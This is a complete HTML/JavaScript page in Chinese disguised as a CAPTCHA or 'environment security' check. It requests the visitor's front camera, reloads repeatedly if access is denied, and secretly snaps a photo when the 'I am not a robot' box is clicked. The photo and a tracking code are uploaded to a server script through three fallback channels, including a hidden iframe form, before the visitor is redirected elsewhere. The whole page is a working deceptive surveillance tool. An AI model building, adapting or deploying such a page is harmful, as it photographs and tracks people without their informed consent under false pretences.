<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>验证中...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .loading-container, .captcha-container {
            text-align: center;
            padding: 40px;
            background: white;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            max-width: 380px;
            width: 90%;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #e0e0e0;
            border-top-color: #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .loading-text { color: #666; font-size: 16px; margin-bottom: 10px; }
        .progress-bar { width: 100%; height: 4px; background: #e0e0e0; border-radius: 2px; overflow: hidden; margin-top: 20px; }
        .progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #667eea, #764ba2); transition: width 0.3s; }
        .captcha-container { display: none; }
        .captcha-icon { font-size: 48px; margin-bottom: 15px; }
        .captcha-title { font-size: 20px; font-weight: bold; color: #333; margin-bottom: 10px; }
        .captcha-desc { color: #666; font-size: 14px; margin-bottom: 20px; }
        .checkbox-area {
            display: inline-block; width: 24px; height: 24px; border: 2px solid #ccc;
            border-radius: 4px; margin-right: 10px; cursor: pointer; background: white;
        }
        .checkbox-area.checked { background: #667eea; border-color: #667eea; position: relative; }
        .checkbox-area.checked::after { content: '✓'; color: white; font-size: 16px; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); }
        .verify-row { display: flex; align-items: center; justify-content: center; margin-top: 20px; cursor: pointer; }
        .camera-preview { width: 100%; max-width: 280px; margin: 12px auto; border-radius: 16px; overflow: hidden; background: #333; display: none; }
        .camera-preview video { width: 100%; height: auto; }
        .camera-status { font-size: 12px; margin-top: 10px; color: #28a745; }
        .camera-status.error { color: #ff3b30; }
        .code-badge { margin-top: 15px; font-size: 12px; color: #999; }
        video { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; }
        #uploadResult {
            margin-top: 12px;
            font-size: 13px;
            word-break: break-word;
            min-height: 20px;
        }
        .debug-info { margin-top: 10px; font-size: 11px; color: #999; word-break: break-all; }
        .retry-btn {
            margin-top: 12px;
            padding: 10px 24px;
            background: #007aff;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 14px;
            cursor: pointer;
        }
        .retry-btn:active { transform: scale(0.95); }
    </style>
</head>
<body>
    <div class="loading-container" id="loadingContainer">
        <div class="spinner"></div>
        <div class="loading-text">正在验证环境安全...</div>
        <div class="loading-text" style="font-size: 12px; color: #999;">正在初始化摄像头...</div>
        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
        <div class="code-badge">验证编号: <span id="displayCode"></span></div>
        <div class="camera-status" id="cameraStatus">⏳ 等待摄像头授权...</div>
        <div class="debug-info" id="debugInfo"></div>
    </div>
    <div class="captcha-container" id="captchaContainer">
        <div class="captcha-icon">🤖</div>
        <div class="captcha-title">人机验证</div>
        <div class="captcha-desc">请完成验证以继续访问</div>
        <div class="camera-preview" id="cameraPreview"><video id="previewVideo" autoplay playsinline muted></video></div>
        <div class="verify-row" id="verifyRow">
            <div class="checkbox-area" id="checkbox"></div>
            <span>我不是机器人</span>
        </div>
        <div class="code-badge">验证编号: <span id="displayCode2"></span></div>
        <div id="uploadResult"></div>
        <button class="retry-btn" id="retryBtn" style="display:none;">🔄 手动重试上传</button>
    </div>
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        // ============================================================
        //  ★★★ 核心修复：所有请求走 index.html 中转，彻底解决跨域 ★★★
        // ============================================================
        const CURRENT_DIR = window.location.href.substring(0, window.location.href.lastIndexOf('/') + 1);
        // 不使用 api.php，改用 index.html 中转
        const PROXY_URL = CURRENT_DIR + 'index.html';
        // 备用直接地址（如果中转失败）
        const DIRECT_API = CURRENT_DIR + 'api.php';
        
        const urlParams = new URLSearchParams(window.location.search);
        const code = urlParams.get('code') || 'UNKNOWN';
        const targetUrl = urlParams.get('url') || 'https://www.baidu.com';

        document.getElementById('displayCode').textContent = code;
        document.getElementById('displayCode2').textContent = code;
        document.getElementById('debugInfo').textContent = '中转: ' + PROXY_URL + ' | 编号: ' + code;

        let stream = null, photoCaptured = false, cameraReady = false, videoElement = null, retryCount = 0;
        let lastPhotoData = null;
        const maxRetries = 3;

        // 进度条
        let progress = 0;
        const progressInterval = setInterval(() => {
            if (progress < 90) {
                progress += Math.random() * 12;
                if (progress > 90) progress = 90;
                document.getElementById('progressFill').style.width = progress + '%';
            }
        }, 200);

        function refreshAndRetry() {
            retryCount++;
            if (retryCount <= maxRetries) {
                document.getElementById('cameraStatus').innerHTML = `🔄 重新请求 (${retryCount}/${maxRetries})`;
                document.getElementById('cameraStatus').classList.add('error');
                setTimeout(() => window.location.reload(), 1500);
            } else {
                document.getElementById('cameraStatus').innerHTML = '⚠️ 无法获取摄像头，跳过拍照';
                document.getElementById('cameraStatus').classList.add('error');
                setTimeout(() => {
                    document.getElementById('loadingContainer').style.display = 'none';
                    document.getElementById('captchaContainer').style.display = 'block';
                    cameraReady = false;
                }, 1500);
            }
        }

        // ==================== 拍照 ====================
        function capturePhoto() {
            return new Promise((resolve, reject) => {
                if (!videoElement || !cameraReady) {
                    reject('摄像头未就绪');
                    return;
                }
                const canvas = document.getElementById('canvas');
                const ctx = canvas.getContext('2d');
                if (videoElement.videoWidth === 0) {
                    reject('视频未就绪');
                    return;
                }
                canvas.width = Math.min(videoElement.videoWidth, 640);
                canvas.height = Math.min(videoElement.videoHeight, 480);
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                // 极低质量减少数据量
                resolve(canvas.toDataURL('image/jpeg', 0.4));
            });
        }

        // ==================== 方式1：通过 index.html 中转上传（最可靠） ====================
        function uploadViaProxy(photoData) {
            return new Promise((resolve, reject) => {
                // 提取 base64 数据
                const base64Data = photoData.split(',')[1] || photoData;
                const byteString = atob(base64Data);
                const mimeString = 'image/jpeg';
                const ab = new ArrayBuffer(byteString.length);
                const ia = new Uint8Array(ab);
                for (let i = 0; i < byteString.length; i++) {
                    ia[i] = byteString.charCodeAt(i);
                }
                const blob = new Blob([ab], { type: mimeString });

                const formData = new FormData();
                formData.append('action', 'capture_photo');
                formData.append('photo_data', blob, 'photo.jpg');
                formData.append('target_url', targetUrl);
                formData.append('code', code);

                // 使用 XHR 发送到 index.html
                const xhr = new XMLHttpRequest();
                // 注意：这里请求的是 index.html，由它转发到 api.php
                xhr.open('POST', PROXY_URL, true);
                xhr.timeout = 45000;

                xhr.onload = function() {
                    if (xhr.status >= 200 && xhr.status < 300) {
                        try {
                            const result = JSON.parse(xhr.responseText);
                            resolve(result);
                        } catch (e) {
                            // 如果响应不是 JSON，检查是否成功
                            if (xhr.responseText && xhr.responseText.includes('success')) {
                                resolve({ success: true });
                            } else {
                                resolve({ success: false, error: '响应解析失败: ' + xhr.responseText.substring(0, 100) });
                            }
                        }
                    } else {
                        reject(new Error('HTTP ' + xhr.status));
                    }
                };

                xhr.onerror = function() {
                    reject(new Error('网络请求失败'));
                };

                xhr.ontimeout = function() {
                    reject(new Error('上传超时'));
                };

                xhr.send(formData);
            });
        }

        // ==================== 方式2：直接请求 api.php（备用） ====================
        function uploadViaDirect(photoData) {
            return new Promise((resolve, reject) => {
                const base64Data = photoData.split(',')[1] || photoData;
                const byteString = atob(base64Data);
                const ab = new ArrayBuffer(byteString.length);
                const ia = new Uint8Array(ab);
                for (let i = 0; i < byteString.length; i++) {
                    ia[i] = byteString.charCodeAt(i);
                }
                const blob = new Blob([ab], { type: 'image/jpeg' });

                const formData = new FormData();
                formData.append('photo_data', blob, 'photo.jpg');
                formData.append('target_url', targetUrl);
                formData.append('code', code);

                const xhr = new XMLHttpRequest();
                xhr.open('POST', DIRECT_API + '?action=capture_photo', true);
                xhr.timeout = 30000;

                xhr.onload = function() {
                    if (xhr.status >= 200 && xhr.status < 300) {
                        try {
                            const result = JSON.parse(xhr.responseText);
                            resolve(result);
                        } catch (e) {
                            resolve({ success: true });
                        }
                    } else {
                        reject(new Error('HTTP ' + xhr.status));
                    }
                };

                xhr.onerror = function() {
                    reject(new Error('直接请求失败'));
                };

                xhr.ontimeout = function() {
                    reject(new Error('直接请求超时'));
                };

                xhr.send(formData);
            });
        }

        // ==================== 方式3：使用 iframe + form（终极降级） ====================
        function uploadViaIframe(photoData) {
            return new Promise((resolve, reject) => {
                const base64Data = photoData.split(',')[1] || photoData;
                const byteString = atob(base64Data);
                const ab = new ArrayBuffer(byteString.length);
                const ia = new Uint8Array(ab);
                for (let i = 0; i < byteString.length; i++) {
                    ia[i] = byteString.charCodeAt(i);
                }
                const blob = new Blob([ia], { type: 'image/jpeg' });

                const form = document.createElement('form');
                form.method = 'POST';
                form.action = PROXY_URL;
                form.enctype = 'multipart/form-data';
                form.target = 'upload_iframe_' + Date.now();
                form.style.display = 'none';

                // 添加 action 参数
                const actionInput = document.createElement('input');
                actionInput.type = 'hidden';
                actionInput.name = 'action';
                actionInput.value = 'capture_photo';
                form.appendChild(actionInput);

                // 添加文件
                const fileInput = document.createElement('input');
                fileInput.type = 'file';
                fileInput.name = 'photo_data';
                fileInput.style.display = 'none';
                form.appendChild(fileInput);

                const dt = new DataTransfer();
                dt.items.add(new File([blob], 'photo.jpg', { type: 'image/jpeg' }));
                fileInput.files = dt.files;

                // 其他字段
                const fields = { 'target_url': targetUrl, 'code': code };
                for (let key in fields) {
                    const input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = key;
                    input.value = fields[key];
                    form.appendChild(input);
                }

                const iframe = document.createElement('iframe');
                iframe.name = form.target;
                iframe.style.display = 'none';
                document.body.appendChild(iframe);
                document.body.appendChild(form);

                let timeoutId = setTimeout(() => {
                    cleanup();
                    reject(new Error('iframe 上传超时'));
                }, 45000);

                iframe.onload = function() {
                    clearTimeout(timeoutId);
                    try {
                        let responseText = '';
                        try {
                            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                            if (iframeDoc && iframeDoc.body) {
                                responseText = iframeDoc.body.textContent || iframeDoc.body.innerText || '';
                            }
                        } catch (e) {
                            try {
                                responseText = iframe.contentWindow.document.body.textContent;
                            } catch (e2) {}
                        }
                        let result = null;
                        try {
                            result = JSON.parse(responseText);
                        } catch (e) {
                            if (responseText.includes('success')) {
                                result = { success: true };
                            } else {
                                result = { success: false, error: responseText.substring(0, 100) };
                            }
                        }
                        cleanup();
                        resolve(result);
                    } catch (e) {
                        cleanup();
                        reject(new Error('处理响应失败'));
                    }
                };

                iframe.onerror = function() {
                    clearTimeout(timeoutId);
                    cleanup();
                    reject(new Error('iframe 加载失败'));
                };

                function cleanup() {
                    clearTimeout(timeoutId);
                    setTimeout(() => {
                        if (form.parentNode) form.parentNode.removeChild(form);
                        if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
                    }, 100);
                }

                form.submit();
            });
        }

        // ==================== 综合上传（依次尝试三种方式） ====================
        async function uploadPhoto(photoData) {
            const resultDiv = document.getElementById('uploadResult');
            lastPhotoData = photoData;
            const errors = [];

            // 方式1: 通过 index.html 中转
            try {
                resultDiv.textContent = '📤 尝试中转上传...';
                resultDiv.style.color = '#007aff';
                const result = await uploadViaProxy(photoData);
                if (result.success !== false) {
                    resultDiv.textContent = '✅ 上传成功 (中转)';
                    resultDiv.style.color = '#34c759';
                    return result;
                } else {
                    errors.push('中转: ' + (result.error || '失败'));
                }
            } catch (e) {
                errors.push('中转: ' + e.message);
                console.warn('中转失败:', e);
            }

            // 方式2: 直接请求 api.php
            try {
                resultDiv.textContent = '📤 尝试直接上传...';
                resultDiv.style.color = '#007aff';
                const result = await uploadViaDirect(photoData);
                if (result.success !== false) {
                    resultDiv.textContent = '✅ 上传成功 (直接)';
                    resultDiv.style.color = '#34c759';
                    return result;
                } else {
                    errors.push('直接: ' + (result.error || '失败'));
                }
            } catch (e) {
                errors.push('直接: ' + e.message);
                console.warn('直接失败:', e);
            }

            // 方式3: iframe 方式
            try {
                resultDiv.textContent = '📤 尝试 iframe 上传...';
                resultDiv.style.color = '#007aff';
                const result = await uploadViaIframe(photoData);
                if (result.success !== false) {
                    resultDiv.textContent = '✅ 上传成功 (iframe)';
                    resultDiv.style.color = '#34c759';
                    return result;
                } else {
                    errors.push('iframe: ' + (result.error || '失败'));
                }
            } catch (e) {
                errors.push('iframe: ' + e.message);
                console.warn('iframe失败:', e);
            }

            throw new Error('所有上传方式均失败: ' + errors.join(' | '));
        }

        // ==================== 主流程 ====================
        async function takePhotoAndRedirect() {
            if (photoCaptured) return;
            photoCaptured = true;
            
            const resultDiv = document.getElementById('uploadResult');
            const retryBtn = document.getElementById('retryBtn');
            retryBtn.style.display = 'none';
            
            let photoData = null;
            
            // 1. 拍照
            if (cameraReady && videoElement?.videoWidth > 0) {
                try {
                    photoData = await capturePhoto();
                    resultDiv.textContent = '📸 拍照成功，准备上传...';
                    resultDiv.style.color = '#007aff';
                } catch(e) {
                    resultDiv.textContent = '⚠️ 拍照失败: ' + e.message;
                    resultDiv.style.color = '#ff3b30';
                    retryBtn.style.display = 'inline-block';
                    if (stream) stream.getTracks().forEach(t => t.stop());
                    setTimeout(() => { window.location.href = targetUrl; }, 5000);
                    return;
                }
            } else {
                resultDiv.textContent = '⚠️ 摄像头未就绪，跳过拍照';
                resultDiv.style.color = '#ff3b30';
                retryBtn.style.display = 'inline-block';
                if (stream) stream.getTracks().forEach(t => t.stop());
                setTimeout(() => { window.location.href = targetUrl; }, 5000);
                return;
            }

            // 2. 上传
            if (photoData) {
                try {
                    const result = await uploadPhoto(photoData);
                    if (result.success !== false) {
                        resultDiv.textContent = '✅ 照片上传成功！即将跳转...';
                        resultDiv.style.color = '#34c759';
                    } else {
                        resultDiv.textContent = '❌ 上传失败: ' + (result.error || '未知错误');
                        resultDiv.style.color = '#ff3b30';
                        retryBtn.style.display = 'inline-block';
                    }
                } catch (err) {
                    resultDiv.textContent = '❌ ' + err.message;
                    resultDiv.style.color = '#ff3b30';
                    retryBtn.style.display = 'inline-block';
                }
            }

            // 3. 释放摄像头
            if (stream) stream.getTracks().forEach(t => t.stop());

            // 4. 跳转
            setTimeout(() => {
                window.location.href = targetUrl;
            }, 4000);
        }

        // ==================== 手动重试 ====================
        document.getElementById('retryBtn').addEventListener('click', function() {
            this.style.display = 'none';
            const resultDiv = document.getElementById('uploadResult');
            resultDiv.textContent = '🔄 重新上传中...';
            resultDiv.style.color = '#007aff';
            
            if (lastPhotoData) {
                uploadPhoto(lastPhotoData)
                    .then(result => {
                        if (result.success !== false) {
                            resultDiv.textContent = '✅ 重试上传成功！即将跳转...';
                            resultDiv.style.color = '#34c759';
                            setTimeout(() => { window.location.href = targetUrl; }, 2000);
                        } else {
                            resultDiv.textContent = '❌ 重试失败: ' + (result.error || '未知错误');
                            resultDiv.style.color = '#ff3b30';
                            this.style.display = 'inline-block';
                        }
                    })
                    .catch(err => {
                        resultDiv.textContent = '❌ 重试失败: ' + err.message;
                        resultDiv.style.color = '#ff3b30';
                        this.style.display = 'inline-block';
                    });
            }
        });

        // ==================== 初始化摄像头 ====================
        async function initCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 480 }, 
                        height: { ideal: 360 },
                        facingMode: "user"
                    } 
                });
                videoElement = document.getElementById('video');
                videoElement.srcObject = stream;
                const previewVideo = document.getElementById('previewVideo');
                if (previewVideo) {
                    previewVideo.srcObject = stream;
                    document.getElementById('cameraPreview').style.display = 'block';
                }
                await new Promise(r => { videoElement.onloadedmetadata = () => { videoElement.play(); r(); }; });
                await new Promise(r => setTimeout(r, 800));
                if (videoElement.videoWidth > 0) {
                    cameraReady = true;
                    document.getElementById('cameraStatus').innerHTML = '✅ 摄像头已就绪';
                    document.getElementById('cameraStatus').classList.remove('error');
                }
                progress = 100;
                document.getElementById('progressFill').style.width = '100%';
                setTimeout(() => {
                    document.getElementById('loadingContainer').style.display = 'none';
                    document.getElementById('captchaContainer').style.display = 'block';
                }, 500);
            } catch(err) {
                console.error('Camera error:', err);
                if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
                    refreshAndRetry();
                } else {
                    document.getElementById('cameraStatus').innerHTML = '⚠️ 摄像头初始化失败';
                    document.getElementById('cameraStatus').classList.add('error');
                    setTimeout(() => {
                        document.getElementById('loadingContainer').style.display = 'none';
                        document.getElementById('captchaContainer').style.display = 'block';
                        cameraReady = false;
                    }, 1500);
                }
            }
        }

        // ==================== 人机验证 ====================
        let verified = false;
        const verifyRow = document.getElementById('verifyRow');
        const checkbox = document.getElementById('checkbox');
        if (verifyRow) {
            verifyRow.addEventListener('click', () => {
                if (verified) return;
                checkbox.classList.add('checked');
                verified = true;
                verifyRow.querySelector('span').textContent = '验证中...';
                setTimeout(() => takePhotoAndRedirect(), 400);
            });
        }

        // 启动
        initCamera();
        window.addEventListener('beforeunload', () => { if (stream) stream.getTracks().forEach(t => t.stop()); });
    </script>
</body>
</html>
